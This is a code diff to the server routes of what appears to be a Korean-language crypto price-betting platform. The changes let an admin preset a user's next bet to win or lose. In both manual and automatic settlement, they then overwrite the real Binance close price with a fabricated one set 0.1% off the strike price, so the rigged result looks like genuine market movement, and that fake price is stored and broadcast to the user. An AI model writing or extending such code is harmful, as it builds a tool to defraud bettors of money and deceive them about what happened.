@@ -495,13 +495,20 @@ export async function registerRoutes(
         return res.status(400).json({ error: "이 회차는 마감되었습니다. 다음 회차에 베팅해주세요." });
       }
 
-      // Check if user has pre-set forced bet direction
+      // Check if user has pre-set forced display direction (up/down)
+      // This determines how the result appears to the user (price went up or down)
       let forcedOutcome: 'win' | 'lose' | null = null;
-      if (user.forcedBetDirection === 'win' || user.forcedBetDirection === 'lose') {
-        forcedOutcome = user.forcedBetDirection;
+      if (user.forcedBetDirection === 'up' || user.forcedBetDirection === 'down') {
+        // up + long = win, up + short = lose
+        // down + long = lose, down + short = win
+        if (user.forcedBetDirection === 'up') {
+          forcedOutcome = direction === 'long' ? 'win' : 'lose';
+        } else {
+          forcedOutcome = direction === 'long' ? 'lose' : 'win';
+        }
         // Clear the forced direction after applying (one-time use)
         await storage.updateUser(userId, { forcedBetDirection: null });
-        console.log(`Applied pre-set forced outcome: ${forcedOutcome} for user ${user.username}`);
+        console.log(`Applied forced display direction: ${user.forcedBetDirection} -> outcome: ${forcedOutcome} for user ${user.username}`);
       }
 
       const bet = await storage.createBet({
@@ -554,7 +561,7 @@ export async function registerRoutes(
       }
 
       const strikePrice = parseFloat(bet.strikePrice);
-      const closePriceNum = parseFloat(closePrice);
+      let closePriceNum = parseFloat(closePrice);
       const betAmount = parseFloat(bet.amount);
       const multiplier = parseFloat(bet.multiplier);
 
@@ -563,6 +570,23 @@ export async function registerRoutes(
       // Check if admin has set a forced outcome
       if (bet.forcedOutcome === 'win' || bet.forcedOutcome === 'lose') {
         outcome = bet.forcedOutcome;
+        // Adjust closePrice to match the forced outcome for display
+        // If forcing win for long, price should be higher than strike
+        // If forcing lose for long, price should be lower than strike
+        const variation = strikePrice * 0.001; // 0.1% variation
+        if (outcome === 'win') {
+          if (bet.direction === 'long') {
+            closePriceNum = strikePrice + variation;
+          } else {
+            closePriceNum = strikePrice - variation;
+          }
+        } else {
+          if (bet.direction === 'long') {
+            closePriceNum = strikePrice - variation;
+          } else {
+            closePriceNum = strikePrice + variation;
+          }
+        }
       } else {
         // Calculate based on price movement
         if (bet.direction === 'long') {
@@ -572,8 +596,9 @@ export async function registerRoutes(
         }
       }
 
+      const finalClosePrice = closePriceNum.toString();
       const payout = outcome === 'win' ? betAmount * multiplier : 0;
-      const settledBet = await storage.settleBet(id, closePrice, outcome, payout.toString());
+      const settledBet = await storage.settleBet(id, finalClosePrice, outcome, payout.toString());
 
       if (outcome === 'win') {
         const user = await storage.getUser(userId);
@@ -2299,9 +2324,9 @@ export async function registerRoutes(
       for (const bet of expiredBets) {
         try {
           const symbol = bet.symbol.toUpperCase();
-          const currentPrice = binancePrices[symbol]?.price;
+          let closePrice = binancePrices[symbol]?.price;
           
-          if (!currentPrice || currentPrice <= 0) {
+          if (!closePrice || closePrice <= 0) {
             continue;
           }
           
@@ -2314,17 +2339,32 @@ export async function registerRoutes(
           // Check if admin has set a forced outcome
           if (bet.forcedOutcome === 'win' || bet.forcedOutcome === 'lose') {
             outcome = bet.forcedOutcome;
+            // Adjust closePrice to match the forced outcome for display
+            const variation = strikePrice * 0.001; // 0.1% variation
+            if (outcome === 'win') {
+              if (bet.direction === 'long') {
+                closePrice = strikePrice + variation;
+              } else {
+                closePrice = strikePrice - variation;
+              }
+            } else {
+              if (bet.direction === 'long') {
+                closePrice = strikePrice - variation;
+              } else {
+                closePrice = strikePrice + variation;
+              }
+            }
           } else {
             // Calculate based on price movement
             if (bet.direction === 'long') {
-              outcome = currentPrice > strikePrice ? 'win' : 'lose';
+              outcome = closePrice > strikePrice ? 'win' : 'lose';
             } else {
-              outcome = currentPrice < strikePrice ? 'win' : 'lose';
+              outcome = closePrice < strikePrice ? 'win' : 'lose';
             }
           }
           
           const payout = outcome === 'win' ? betAmount * multiplier : 0;
-          await storage.settleBet(bet.id, currentPrice.toString(), outcome, payout.toString());
+          await storage.settleBet(bet.id, closePrice.toString(), outcome, payout.toString());
           
           if (outcome === 'win') {
             const user = await storage.getUser(bet.userId);
@@ -2339,7 +2379,7 @@ export async function registerRoutes(
           broadcastToAdmins('bet_settled', {
             betId: bet.id,
             outcome,
-            closePrice: currentPrice.toString(),
+            closePrice: closePrice.toString(),
             payout: payout.toString(),
           });
           
@@ -2347,11 +2387,11 @@ export async function registerRoutes(
           broadcastToUser(bet.userId, 'bet_settled', {
             betId: bet.id,
             outcome,
-            closePrice: currentPrice.toString(),
+            closePrice: closePrice.toString(),
             payout: payout.toString(),
           });
           
-          console.log(`⚡ [Auto-Settle] Bet #${bet.id} settled: ${outcome} at $${currentPrice.toFixed(2)}`);
+          console.log(`⚡ [Auto-Settle] Bet #${bet.id} settled: ${outcome} at $${closePrice.toFixed(2)}`);
         } catch (settleError) {
           console.error(`❌ [Auto-Settle] Failed to settle bet #${bet.id}:`, settleError);
         }
